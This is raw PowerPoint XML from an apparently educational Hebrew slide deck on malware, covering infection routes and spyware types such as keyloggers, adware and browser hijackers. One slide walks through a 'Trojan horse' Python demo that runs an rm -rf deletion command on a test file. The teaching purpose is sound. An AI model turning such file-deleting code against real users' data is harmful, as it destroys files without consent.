        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תשובות – המשך </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F8FCDF46-F324-42EC-A180-4FFD0F5AF7D0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   א. הורדה של קבצים נגועים: למשל, קבצים מצורפים לאימייל, משחקים לא חוקיים, או תוכנות חינמיות מאתרים לא מהימנים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   ב. אתרי אינטרנט זדוניים: ביקור באתרים שנבנו להפיץ תוכנות זדוניות דרך ניצול חולשות דפדפן.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   ג. עדכונים מזויפים: הורדה של עדכונים מזויפים למערכת או לתוכנות מוכרות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   ד. מדיה חיצונית נגועה: כמו דיסק און קי שמכיל קבצים נגועים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25064183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EADF20E-CFC0-4E45-A544-6E0D89279574}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2892286" y="642594"/>
            <a:ext cx="8232913" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יצירת סוס טרויאני שמוחק קבצים</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{76228115-A898-4F46-983C-C1B432692579}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שלב 1: יצירת סוס טרויאני פשוט:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בואו נתחיל ביצירת סוס טרויאני פשוט בשפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Python</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הקוד הבא יראה כיצד ליצור סוס טרויאני שמשתמש בפקודת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>os.system</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי לבצע פעולה זדונית פשוטה כמו מחיקת קובץ:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>import </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>os</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>def trojan():</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    # </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>פקודה שמוחקת קובץ בשם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>example.txt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>os.system</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>("rm -rf ~/example.txt")</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>if __name__ == "__main__":</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    trojan()</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25897820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F3CCFF8-8F3B-41C7-B21E-1A7824CDFCBD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2932042" y="642594"/>
            <a:ext cx="8193157" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יצירת סוס טרויאני שמוחק קבצים</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5E7200E6-28EE-4B1A-B932-0682A3640D86}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שלב 2: הפעלת הסוס הטרויאני:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>פתח את עורך הטקסט המועדף עליך כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nano</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> וכתוב את הקוד שראינו למעלה. שמור את הקובץ בשם:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nano</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> trojan.py</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לפני שנריץ את הקוד, ניצור קובץ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>example.txt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>touch ~/example.txt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הרצת הסוס הטרויאני:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> עכשיו נריץ את הסקריפט:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>python3 trojan.py</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>וע"י הפקודה הבאה, אנו נראה שהקובץ נמחק:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ls ~/</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="35479805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657622EE-5B49-4384-A806-D3BC74FDA510}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2341659"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="he-IL" sz="8000" dirty="0"/>
              <a:t>רוגלה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8000" dirty="0"/>
              <a:t>Spyware</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" sz="8000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="20380378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DCB3A6A-7AC7-4DE5-9780-7CBC699F2497}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5297556" y="642594"/>
            <a:ext cx="5827643" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מהי רוגלה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Spyware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{40896B91-BEB1-444E-BE88-666BE48F8935}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2500685"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>רוגלה היא תוכנה זדונית שמטרתה לאסוף מידע על המשתמש או על המערכת בה היא מותקנת, ללא ידיעת המשתמש או הסכמתו. המידע שנאסף יכול לכלול נתונים אישיים, כמו סיסמאות, פרטי כרטיסי אשראי, היסטוריית גלישה, הקשות מקלדת ועוד. המידע שנאסף מועבר למפתחי הרוגלה או לגורמים אחרים לצורך שימוש זדוני.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="750493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ECC1AA5-20D9-4E67-82D6-08C2A8E07270}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8249478" y="642594"/>
            <a:ext cx="2875722" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סוגי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>רוגלות</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1521BFD8-885B-4292-8136-4B9DCBAE55FE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Keyloggers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>רושמי הקשות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מה זה: תוכנות המנטרות את כל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>ההקלדות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שהמשתמש מבצע על המקלדת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמה: אם יש לך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Keylogger</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מותקן על המחשב, הוא יכול לאסוף את כל הסיסמאות שאתה מקליד ולאחסן אותן בקובץ שהאקר יכול לגשת אליו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Adware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תוכנות פרסום:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מה זה: תוכנות שמציגות פרסומות במחשב, בדרך כלל בצורה אגרסיבית, כדי לגרום למשתמש ללחוץ על הקישורים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמה: לאחר התקנה של תוכנת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ,Adware </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אתה עשוי לראות חלונות קופצים רבים עם פרסומות לאתרים שונים בכל פעם שאתה גולש באינטרנט.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32558370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CDE9E9A-03FE-4E71-A231-33474B713A46}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="642594"/>
            <a:ext cx="5029200" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך – סוגי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>רוגלות</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{781CB721-F493-44C8-A6AB-46F5292BCC46}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Trojan Spyware </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>רוגלות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> המסתתרות בטרויאנים:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מה זה: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>רוגלות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שמגיעות כחלק מתוכנה תמימה למראה, אך בפועל מבצעות פעולות זדוניות ברקע.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמה: ייתכן שתוריד קובץ שנראה כתוכנה מועילה, אך בפועל הוא רוגלה שצופה בכל הפעולות שאתה מבצע על המחשב.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Tracking Cookies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>עוגיות מעקב:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מה זה: קבצים קטנים שמאוחסנים במחשב שלך ומאפשרים לאתרי אינטרנט לעקוב אחרי פעילות הגלישה שלך.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמה: עוגיות מעקב עשויות לשמש לפרסומות ממוקדות, שמופיעות על סמך האתרים שבהם ביקרת בעבר.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15245993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796B41D-D8BC-46A2-BC65-3D562FB12E19}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4194312" y="642594"/>
            <a:ext cx="6930887" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>איך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>רוגלות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> חודרות למחשב?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0FC2C7E3-A4B7-4399-BF91-C45AFF0DF056}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>רוגלות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יכולות להיכנס למחשב שלך בדרכים שונות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הורדת תוכנה מזויפת או זדונית:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>רוגלות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> רבות מגיעות יחד עם תוכנות חינמיות (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Freeware) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>או תוכנות פיראטיות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>קישורים זדוניים:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לחיצה על קישור באימייל או הודעת טקסט לא מוכרים, שיכול להוביל להורדת רוגלה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>ניצול </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> אבטחה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>רוגלות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> עשויות לנצל חולשות בתוכנה או במערכת ההפעלה כדי להתקין את עצמן ללא ידיעת המשתמש.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15564439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D97E7F-7A86-4E9F-A390-3C2D59B650C0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6410738" y="642594"/>
            <a:ext cx="4714461" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סוגי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>רוגלות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> נוספים</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CE7FCAA1-CC91-4CE3-B824-9B6A1BE4E40A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Browser Hijackers .1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>חוטפי דפדפן:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מה זה: תוכנות שמשתלטות על דפדפן האינטרנט שלך ומשנות את הגדרותיו, כמו דף הבית או מנוע החיפוש המוגדר כברירת מחדל.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמה: אם פתאום דף הבית שלך השתנה לדף שאתה לא מכיר, או שאתה מופנה למנוע חיפוש לא מוכר, ייתכן שנפלת קורבן ל-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Browser Hijacker</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> System Monitors</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>מנטרי</a:t>
            </a:r>
            <a:r>
